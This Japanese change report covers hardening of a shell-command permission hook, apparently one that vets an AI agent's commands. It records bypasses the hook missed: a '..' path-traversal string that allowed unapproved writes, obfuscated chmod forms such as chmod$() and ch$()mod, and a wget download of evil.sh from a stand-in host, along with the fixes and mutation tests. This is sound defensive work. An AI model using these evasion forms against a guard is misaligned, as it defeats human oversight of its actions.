実施した内容と結果

  1. 1

    1. 切り詰めの「門」をバイトにする ✕問題 根拠: C.UTF-8 で 6008 → 4094 バイト / 2 ロケールで FAIL 0

    __hc_bytelen（local LC_ALL=C）で測る側だけをバイトにして、起動する判定は ${#line} のままだった。__hc_cap_json_field の 512 も同じ。この環境の既定ロケールが byte 指向なので、0033 が新設した多バイトのテストごと緑になっていた。門を __hc_bytelen に変え、フィールド切り詰めの後も測り直すようにした。フィールド側は「収まる最大の長さを二分探索」にした（比例で引くだけだと 1 回で負に振り切れて内容が全部落ちる）。全件テストを 2 ロケールで回すようにしたのは、この型を今後も拾うため。

    根拠を見る（実行コマンドと出力） 
    # 日本語 2000 字（6008 バイト）の行
                      0033 後      0035 後
既定ロケール          2072 バイト   4095 バイト
LC_ALL=C.UTF-8        6008 バイト   4094 バイト   ← 上限 4096 を超えていた

# 検出力: 門を ${#line} に戻して LC_ALL=C.UTF-8
FAIL HK-T17: 多バイトで上限を超えた: 6008

    結論

    上限がバイトで定義されているなら判定もバイトで行う。${#s} はロケール依存で、既定が byte 指向の環境ではテストごと緑になる。

  2. 2

    2. gitdir: の .. で前方一致を破れる ✕問題 根拠: HK-T18 の検出力 4 件

    0033 は「指す先の実在と、そこからの相互参照まで要求する」と書いたが、指す先が .git/worktrees/ の外でもよかった。<root>/.git/worktrees/../../wip/tmp/x は前方一致を通り、実体は common.allow に入っていて無承認で書ける。__hc_winpath に .. と . の畳みを入れた（セグメント走査。realpath を呼ばないので fork ゼロ）。畳む場所を正規化の段にしたので、他の比較（HOOK_ROOT と候補の一致判定）にも同じ保証が効く。

    根拠を見る（実行コマンドと出力） 
    # 0033 後
.. 入り → HOOK_WORKTREE=…/evil        ← 偽装成功

# 0035 後
.. 入り → HOOK_WORKTREE=…/root
/c/a/.git/worktrees/../../wip/tmp/x → C:/a/wip/tmp/x

# 検出力: `..` を普通のセグメントとして扱う変異
FAIL HK-T18: expected '…/wtroot' actual '…/traversal'   ほか 3 件

    結論

    前方一致でパスの場所を検査するなら、比較の前に .. を畳む。畳まないと <許可された前置き>/../<任意の場所> で破れる。

  3. 3

    3. $ でコマンドを割る 6 形 ✕問題 根拠: BC-T01 の検出力 7 件 / 手動確認 22 形すべて DENY

    chmod$() chmod$'' chmod$(true) chmod${x} chmod$@ chmod$* ch$()mod はいずれも bash が chmod として実行するのに、正規化後の実行体が chmod$ / ch$ になり、$ 始まりでないので opaque にもならず、クォートを含まない形は制御方式 5 も走らなかった。_bc_deobfuscate を新設し、$(...)（入れ子を数える）・${...}・`...`・$名前 / $@ / $* を落とす。前置判定は記号を落としただけの複製にも当てるので ch$()mod も絞り込みを通る。

    根拠を見る（実行コマンドと出力） 
    # 実際に起動するか（0033 時点）
$ bash -c 'chmod$@ --version'   → chmod (GNU coreutils) 8.32
$ bash -c 'ch$()mod --version'  → chmod (GNU coreutils) 8.32
$ bash -c 'chmod${x} --version' → chmod (GNU coreutils) 8.32

# 判定             0033 後   0035 後
chmod$() +x a        ALLOW     DENY
chmod$'' +x a        ALLOW     DENY
chmod$(true) +x a    ALLOW     DENY
chmod${x} +x a       ALLOW     DENY

    結論

    0027 からある穴で、0033 が「クォート回避を塞いだ」と主張した族の残り。列挙で追う方針なので網羅は主張できない（r2）。

  4. 4

    4. 制御方式 5 の過剰拒否（0033 が入れた回帰） △注意 根拠: BC-T02 の検出力 5 件

    クォートを構文ごと落として再解析するので、文字列リテラル内の ; | ( ) が本物の区切りに昇格していた。落とすのを「空のクォート対」と「中身の見えない展開」だけに絞った。削除しかしないので昇格が起きない。$ 族 8 形の拒否と、引用符の中に区切り文字がある 5 形の許可が同時に成り立つのは、この絞り方だけ — 0033 の「構文ごと落とす」では必ずどちらかが壊れる。

    根拠を見る（実行コマンドと出力） 
    #                                                        0033 後  0035 後
git commit -m "fix: 権限は触らない; chmod は使わない"      DENY     ALLOW
echo "NG: cd x; chmod +x a" >> wip/tmp/note.md            DENY     ALLOW
grep -n "a | chmod" doc.md                                 DENY     ALLOW
echo "使うな: (chmod)"                                     DENY     ALLOW
printf "%s" "a; chmod 600 f" >> notes.md                  DENY     ALLOW
bash -c "chmod +x a"                                       DENY     DENY   ← 保つ

    結論

    このプロジェクトはコミットメッセージや文書で chmod に言及するので、現実に踏む型だった。

  5. 5

    5. wget -o は本体の出力先ではない（0033 が入れた回帰） △注意 根拠: HK-T15 の検出力 3 件

    -o / --output-file / --append-output はログファイルで、本体は依然として URL の basename をカレントに書く。0033 はこれらを出力先として数えたため既定の _ が落ち、実際に落ちてくる evil.sh が呼び手から見えなくなっていた。body_out を足し、本体の出力先（curl の -o / -O / --output / --output-dir / --remote-name、wget の -O / --output-document）が指定されたときだけ立てる形にした。あわせて curl --libcurl を出力先の列挙に足した。

    根拠を見る（実行コマンドと出力） 
    #                                          0033 後            0035 後
wget -o log.txt http://e/evil.sh           write[log.txt]     write[log.txt,_]
wget --output-file=log.txt http://e/evil.sh write[log.txt]    write[log.txt,_]
wget -O out.sh http://e/evil.sh            write[out.sh]      write[out.sh]
wget -q -o log.txt -O out.sh http://e/a    —                  write[log.txt,out.sh]
curl --libcurl out.c http://e/a            web                write[out.c]

    結論

    呼び手はログファイルだけを §8 に当て、実際に落ちるファイルを見ないままだった。

  7. 7

    7. redact の非短絡経路 ◎良 根拠: 新旧 3 版の直接比較 + 同値性 500 回

    短絡は「40 字以上の語が 1 つも無い」ときだけ効く。40 桁の SHA が 1 個混じるだけで規則 5 の本体に落ち、コストが区切り文字の個数に比例していた。hook_record は target に ${HOOK_COMMAND:0:120} を入れるので、git log <sha> を記録するたびにこの経路に入る。規則 5 を「正規表現で 1 個ずつ取り、前後で切る」形にして当たりの個数に比例させた。語が 256 字より長いときだけ位置ベースの走査に切り替える（${rest%%"$m"*} は $m が長いと壊滅的に遅いため）。

    0033 の計測セットは非短絡が「1 語 4000 字」（read が 1 回しか回らない最良形）だけで、区切りの多い非短絡ケースを 1 件も測っていなかった。

  8. 8

    8. テストの検出力 ◎良 根拠: 6 か所で「壊すと落ちる・戻すと通る」

    HK-T18 に足した /c/… ↔ C:/… のケースは一度も実行されていなかった（mktemp は /tmp/... を返すので条件が常に偽）。実在ディレクトリに依らず __hc_winpath 単体を突き合わせる 7 assert に置き換えた。足した traversal のケースも、最初は .. の段数が 1 つ足りず何も検査していなかった — .git/worktrees/../outside は .git/outside を指すので -d で落ちるだけ。変異を入れても落ちなかったので気付き、../../outside に直して初めて検出力が出た。さらに変異そのものが元の実装を再現していなかったことも 1 度あった（if false で潰すと「.. を捨てる」挙動になる）。
